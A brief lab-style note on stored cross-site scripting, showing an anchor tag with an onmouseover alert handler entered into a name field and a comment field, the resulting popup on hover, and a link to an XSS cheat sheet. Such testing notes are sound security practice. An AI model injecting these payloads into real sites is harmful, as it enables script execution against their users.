# Cross Site Scripting (XSS) – Stored

## Input
Name: abc
Comment: `<a onmouseover="alert(1)">test</a>`
Output: When hover of the test comment, alert 1 pop up

Name: `<a onmouseover="alert(1)">test</a>`
Comment: abc
Output: When hover of `test` user, alert 1 pop up

## References
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt